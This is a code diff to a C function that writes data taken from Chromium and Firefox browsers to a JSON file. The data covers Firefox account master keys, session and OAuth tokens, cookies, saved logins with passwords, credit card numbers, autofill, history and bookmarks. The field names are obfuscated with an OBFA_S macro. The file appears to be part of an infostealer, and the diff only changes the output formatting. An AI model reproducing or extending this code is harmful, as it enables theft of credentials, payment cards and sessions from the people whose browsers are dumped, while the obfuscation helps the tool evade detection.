@@ -203,48 +203,48 @@ BOOL WriteChromiumDataToJson(IN PCHROMIUM_DATA pChromiumData, IN LPCSTR pszFileP
     // Write UTF-8 BOM
     WriteFile(hFile, "\xEF\xBB\xBF", 3, &dwWritten, NULL);
 
-    ASCII_JSON_WRITE("{");
+    ASCII_JSON_WRITE("{\n");
 
     // Firefox-only data
     if (pChromiumData->pFireFoxBrsrData)
     {
-        ASCII_JSON_WRITE(OBFA_S("  \"firefox_account\": {"));
+        ASCII_JSON_WRITE(OBFA_S("  \"firefox_account\": {\n"));
 
         ASCII_JSON_WRITE(OBFA_S("    \"master_key\": "));
         WriteJsonHex(hFile, pChromiumData->pFireFoxBrsrData->pbMasterKey, pChromiumData->pFireFoxBrsrData->dwMasterKeyLen);
-        ASCII_JSON_WRITE(",");
+        ASCII_JSON_WRITE(",\n");
 
         ASCII_JSON_WRITE(OBFA_S("    \"email\": "));
         WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szEmail);
-        ASCII_JSON_WRITE(",");
+        ASCII_JSON_WRITE(",\n");
 
         ASCII_JSON_WRITE(OBFA_S("    \"uid\": "));
         WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szUid);
-        ASCII_JSON_WRITE(",");
+        ASCII_JSON_WRITE(",\n");
 
         ASCII_JSON_WRITE(OBFA_S("    \"verified\": "));
         ASCII_JSON_WRITE(pChromiumData->pFireFoxBrsrData->bVerified ? "true" : "false");
-        ASCII_JSON_WRITE(",");
+        ASCII_JSON_WRITE(",\n");
 
         ASCII_JSON_WRITE(OBFA_S("    \"session_token\": "));
         WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szSessionToken);
-        ASCII_JSON_WRITE(",");
+        ASCII_JSON_WRITE(",\n");
 
         ASCII_JSON_WRITE(OBFA_S("    \"sync_oauth_token\": "));
         WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szSyncOAuthToken);
-        ASCII_JSON_WRITE(",");
+        ASCII_JSON_WRITE(",\n");
 
         ASCII_JSON_WRITE(OBFA_S("    \"profile_oauth_token\": "));
         WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szProfileOAuthToken);
-        ASCII_JSON_WRITE(",");
+        ASCII_JSON_WRITE(",\n");
 
         ASCII_JSON_WRITE(OBFA_S("    \"send_tab_private_key\": "));
         WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szSendTabPrivateKey);
-        ASCII_JSON_WRITE(",");
+        ASCII_JSON_WRITE(",\n");
 
         ASCII_JSON_WRITE(OBFA_S("    \"close_tab_private_key\": "));
         WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szCloseTabPrivateKey);
-        ASCII_JSON_WRITE("");
+        ASCII_JSON_WRITE("\n");
 
         ASCII_JSON_WRITE("  },\n");
     }
@@ -262,122 +262,121 @@ BOOL WriteChromiumDataToJson(IN PCHROMIUM_DATA pChromiumData, IN LPCSTR pszFileP
 
         // Tokens
         dwCount = bShowAll ? pChromiumData->dwTokenCount : min(pChromiumData->dwTokenCount, MAX_DISPLAY_COUNT);
-        ASCII_JSON_WRITE(OBFA_S("  \"tokens\": ["));
+        ASCII_JSON_WRITE(OBFA_S("  \"tokens\": [\n"));
         for (DWORD i = 0; i < dwCount; i++)
         {
-            ASCII_JSON_WRITE("    {");
-            ASCII_JSON_WRITE(OBFA_S("      \"service\": ")); WriteJsonString(hFile, pChromiumData->pTokens[i].pszService); ASCII_JSON_WRITE(",");
-            ASCII_JSON_WRITE(OBFA_S("      \"token\": ")); WriteJsonBinaryAsString(hFile, pChromiumData->pTokens[i].pbToken, pChromiumData->pTokens[i].dwTokenLen); ASCII_JSON_WRITE(",");
-            ASCII_JSON_WRITE(OBFA_S("      \"bind_key\": ")); WriteJsonHex(hFile, pChromiumData->pTokens[i].pbBindKey, pChromiumData->pTokens[i].dwBindKeyLen); ASCII_JSON_WRITE("");
+            ASCII_JSON_WRITE("    {\n");
+            ASCII_JSON_WRITE(OBFA_S("      \"service\": ")); WriteJsonString(hFile, pChromiumData->pTokens[i].pszService); ASCII_JSON_WRITE(",\n");
+            ASCII_JSON_WRITE(OBFA_S("      \"token\": ")); WriteJsonBinaryAsString(hFile, pChromiumData->pTokens[i].pbToken, pChromiumData->pTokens[i].dwTokenLen); ASCII_JSON_WRITE(",\n");
+            ASCII_JSON_WRITE(OBFA_S("      \"bind_key\": ")); WriteJsonHex(hFile, pChromiumData->pTokens[i].pbBindKey, pChromiumData->pTokens[i].dwBindKeyLen); ASCII_JSON_WRITE("\n");
             ASCII_JSON_WRITE("    }");
             if (i < dwCount - 1) ASCII_JSON_WRITE(",");
-            ASCII_JSON_WRITE("");
+            ASCII_JSON_WRITE("\n");
         }
         ASCII_JSON_WRITE("  ],\n");
     }
 
     // Cookies
     dwCount = bShowAll ? pChromiumData->dwCookieCount : min(pChromiumData->dwCookieCount, MAX_DISPLAY_COUNT);
-    ASCII_JSON_WRITE(OBFA_S("  \"cookies\": ["));
+    ASCII_JSON_WRITE(OBFA_S("  \"cookies\": [\n"));
     for (DWORD i = 0; i < dwCount; i++)
     {
-        ASCII_JSON_WRITE("    {");
-        ASCII_JSON_WRITE(OBFA_S("      \"host\": ")); WriteJsonString(hFile, pChromiumData->pCookies[i].pszHostKey); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"path\": ")); WriteJsonString(hFile, pChromiumData->pCookies[i].pszPath); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"name\": ")); WriteJsonString(hFile, pChromiumData->pCookies[i].pszName); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"value\": ")); WriteJsonBinaryAsString(hFile, pChromiumData->pCookies[i].pbValue, pChromiumData->pCookies[i].dwValueLen); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"expires_utc\": ")); WriteJsonTimestamp(hFile, pChromiumData->pCookies[i].llExpiresUtc); ASCII_JSON_WRITE("");
+        ASCII_JSON_WRITE("    {\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"host\": ")); WriteJsonString(hFile, pChromiumData->pCookies[i].pszHostKey); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"path\": ")); WriteJsonString(hFile, pChromiumData->pCookies[i].pszPath); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"name\": ")); WriteJsonString(hFile, pChromiumData->pCookies[i].pszName); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"value\": ")); WriteJsonBinaryAsString(hFile, pChromiumData->pCookies[i].pbValue, pChromiumData->pCookies[i].dwValueLen); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"expires_utc\": ")); WriteJsonTimestamp(hFile, pChromiumData->pCookies[i].llExpiresUtc); ASCII_JSON_WRITE("\n");
         ASCII_JSON_WRITE("    }");
         if (i < dwCount - 1) ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE("");
+        ASCII_JSON_WRITE("\n");
     }
     ASCII_JSON_WRITE("  ],\n");
 
     // Logins
     dwCount = bShowAll ? pChromiumData->dwLoginCount : min(pChromiumData->dwLoginCount, MAX_DISPLAY_COUNT);
-    ASCII_JSON_WRITE(OBFA_S("  \"logins\": ["));
+    ASCII_JSON_WRITE(OBFA_S("  \"logins\": [\n"));
     for (DWORD i = 0; i < dwCount; i++)
     {
-        ASCII_JSON_WRITE("    {");
-        ASCII_JSON_WRITE(OBFA_S("      \"origin_url\": ")); WriteJsonString(hFile, pChromiumData->pLogins[i].pszOriginUrl); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"action_url\": ")); WriteJsonString(hFile, pChromiumData->pLogins[i].pszActionUrl); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"username\": ")); WriteJsonString(hFile, pChromiumData->pLogins[i].pszUsername); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"password\": ")); WriteJsonBinaryAsString(hFile, pChromiumData->pLogins[i].pbPassword, pChromiumData->pLogins[i].dwPasswordLen); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"date_created\": ")); WriteJsonTimestamp(hFile, pChromiumData->pLogins[i].llDateCreated); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"date_last_used\": ")); WriteJsonTimestamp(hFile, pChromiumData->pLogins[i].llDateLastUsed); ASCII_JSON_WRITE("");
+        ASCII_JSON_WRITE("    {\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"origin_url\": ")); WriteJsonString(hFile, pChromiumData->pLogins[i].pszOriginUrl); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"action_url\": ")); WriteJsonString(hFile, pChromiumData->pLogins[i].pszActionUrl); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"username\": ")); WriteJsonString(hFile, pChromiumData->pLogins[i].pszUsername); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"password\": ")); WriteJsonBinaryAsString(hFile, pChromiumData->pLogins[i].pbPassword, pChromiumData->pLogins[i].dwPasswordLen); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"date_created\": ")); WriteJsonTimestamp(hFile, pChromiumData->pLogins[i].llDateCreated); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"date_last_used\": ")); WriteJsonTimestamp(hFile, pChromiumData->pLogins[i].llDateLastUsed); ASCII_JSON_WRITE("\n");
         ASCII_JSON_WRITE("    }");
         if (i < dwCount - 1) ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE("");
+        ASCII_JSON_WRITE("\n");
     }
     ASCII_JSON_WRITE("  ],\n");
 
     // Credit Cards
     dwCount = bShowAll ? pChromiumData->dwCreditCardCount : min(pChromiumData->dwCreditCardCount, MAX_DISPLAY_COUNT);
-    ASCII_JSON_WRITE(OBFA_S("  \"credit_cards\": ["));
+    ASCII_JSON_WRITE(OBFA_S("  \"credit_cards\": [\n"));
     for (DWORD i = 0; i < dwCount; i++)
     {
-        ASCII_JSON_WRITE("    {");
-        ASCII_JSON_WRITE(OBFA_S("      \"name_on_card\": ")); WriteJsonString(hFile, pChromiumData->pCreditCards[i].pszNameOnCard); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"nickname\": ")); WriteJsonString(hFile, pChromiumData->pCreditCards[i].pszNickname); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"card_number\": ")); WriteJsonBinaryAsString(hFile, pChromiumData->pCreditCards[i].pbCardNumber, pChromiumData->pCreditCards[i].dwCardNumberLen); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"expiration_month\": ")); WriteJsonDword(hFile, pChromiumData->pCreditCards[i].dwExpirationMonth); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"expiration_year\": ")); WriteJsonDword(hFile, pChromiumData->pCreditCards[i].dwExpirationYear); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"date_modified\": ")); WriteJsonTimestamp(hFile, pChromiumData->pCreditCards[i].llDateModified); ASCII_JSON_WRITE("");
+        ASCII_JSON_WRITE("    {\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"name_on_card\": ")); WriteJsonString(hFile, pChromiumData->pCreditCards[i].pszNameOnCard); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"nickname\": ")); WriteJsonString(hFile, pChromiumData->pCreditCards[i].pszNickname); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"card_number\": ")); WriteJsonBinaryAsString(hFile, pChromiumData->pCreditCards[i].pbCardNumber, pChromiumData->pCreditCards[i].dwCardNumberLen); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"expiration_month\": ")); WriteJsonDword(hFile, pChromiumData->pCreditCards[i].dwExpirationMonth); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"expiration_year\": ")); WriteJsonDword(hFile, pChromiumData->pCreditCards[i].dwExpirationYear); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"date_modified\": ")); WriteJsonTimestamp(hFile, pChromiumData->pCreditCards[i].llDateModified); ASCII_JSON_WRITE("\n");
         ASCII_JSON_WRITE("    }");
         if (i < dwCount - 1) ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE("");
+        ASCII_JSON_WRITE("\n");
     }
     ASCII_JSON_WRITE("  ],\n");
 
     // Autofill
     dwCount = bShowAll ? pChromiumData->dwAutofillCount : min(pChromiumData->dwAutofillCount, MAX_DISPLAY_COUNT);
-    ASCII_JSON_WRITE(OBFA_S("  \"autofill\": ["));
+    ASCII_JSON_WRITE(OBFA_S("  \"autofill\": [\n"));
     for (DWORD i = 0; i < dwCount; i++)
     {
-        ASCII_JSON_WRITE("    {");
-        ASCII_JSON_WRITE(OBFA_S("      \"name\": ")); WriteJsonString(hFile, pChromiumData->pAutofill[i].pszName); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"value\": ")); WriteJsonString(hFile, pChromiumData->pAutofill[i].pszValue); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"count\": ")); WriteJsonDword(hFile, pChromiumData->pAutofill[i].dwCount); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"date_created\": ")); WriteJsonTimestamp(hFile, pChromiumData->pAutofill[i].llDateCreated); ASCII_JSON_WRITE("");
+        ASCII_JSON_WRITE("    {\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"name\": ")); WriteJsonString(hFile, pChromiumData->pAutofill[i].pszName); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"value\": ")); WriteJsonString(hFile, pChromiumData->pAutofill[i].pszValue); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"count\": ")); WriteJsonDword(hFile, pChromiumData->pAutofill[i].dwCount); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"date_created\": ")); WriteJsonTimestamp(hFile, pChromiumData->pAutofill[i].llDateCreated); ASCII_JSON_WRITE("\n");
         ASCII_JSON_WRITE("    }");
         if (i < dwCount - 1) ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE("");
+        ASCII_JSON_WRITE("\n");
     }
     ASCII_JSON_WRITE("  ],\n");
 
     // History
     dwCount = bShowAll ? pChromiumData->dwHistoryCount : min(pChromiumData->dwHistoryCount, MAX_DISPLAY_COUNT);
-    ASCII_JSON_WRITE(OBFA_S("  \"history\": ["));
+    ASCII_JSON_WRITE(OBFA_S("  \"history\": [\n"));
     for (DWORD i = 0; i < dwCount; i++)
     {
-        ASCII_JSON_WRITE("    {");
-        ASCII_JSON_WRITE(OBFA_S("      \"url\": ")); WriteJsonString(hFile, pChromiumData->pHistory[i].pszUrl); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"title\": ")); WriteJsonString(hFile, pChromiumData->pHistory[i].pszTitle); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"visit_count\": ")); WriteJsonDword(hFile, pChromiumData->pHistory[i].dwVisitCount); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"last_visit_time\": ")); WriteJsonTimestamp(hFile, pChromiumData->pHistory[i].llLastVisitTime); ASCII_JSON_WRITE("");
+        ASCII_JSON_WRITE("    {\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"url\": ")); WriteJsonString(hFile, pChromiumData->pHistory[i].pszUrl); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"title\": ")); WriteJsonString(hFile, pChromiumData->pHistory[i].pszTitle); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"visit_count\": ")); WriteJsonDword(hFile, pChromiumData->pHistory[i].dwVisitCount); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"last_visit_time\": ")); WriteJsonTimestamp(hFile, pChromiumData->pHistory[i].llLastVisitTime); ASCII_JSON_WRITE("\n");
         ASCII_JSON_WRITE("    }");
         if (i < dwCount - 1) ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE("");
+        ASCII_JSON_WRITE("\n");
     }
     ASCII_JSON_WRITE("  ],\n");
 
     // Bookmarks
     dwCount = bShowAll ? pChromiumData->dwBookmarkCount : min(pChromiumData->dwBookmarkCount, MAX_DISPLAY_COUNT);
-    ASCII_JSON_WRITE(OBFA_S("  \"bookmarks\": ["));
+    ASCII_JSON_WRITE(OBFA_S("  \"bookmarks\": [\n"));
     for (DWORD i = 0; i < dwCount; i++)
     {
-        ASCII_JSON_WRITE("    {");
-        ASCII_JSON_WRITE(OBFA_S("      \"name\": ")); WriteJsonString(hFile, pChromiumData->pBookmarks[i].pszName); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"url\": ")); WriteJsonString(hFile, pChromiumData->pBookmarks[i].pszUrl); ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE(OBFA_S("      \"date_added\": ")); WriteJsonTimestamp(hFile, pChromiumData->pBookmarks[i].llDateAdded); ASCII_JSON_WRITE("");
+        ASCII_JSON_WRITE("    {\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"name\": ")); WriteJsonString(hFile, pChromiumData->pBookmarks[i].pszName); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"url\": ")); WriteJsonString(hFile, pChromiumData->pBookmarks[i].pszUrl); ASCII_JSON_WRITE(",\n");
+        ASCII_JSON_WRITE(OBFA_S("      \"date_added\": ")); WriteJsonTimestamp(hFile, pChromiumData->pBookmarks[i].llDateAdded); ASCII_JSON_WRITE("\n");
         ASCII_JSON_WRITE("    }");
         if (i < dwCount - 1) ASCII_JSON_WRITE(",");
-        ASCII_JSON_WRITE("");
+        ASCII_JSON_WRITE("\n");
     }
-    ASCII_JSON_WRITE("  ]");
+    ASCII_JSON_WRITE("  ]\n");
 
-
-    ASCII_JSON_WRITE("}");
+    ASCII_JSON_WRITE("}\n");
 
     CloseHandle(hFile);
 
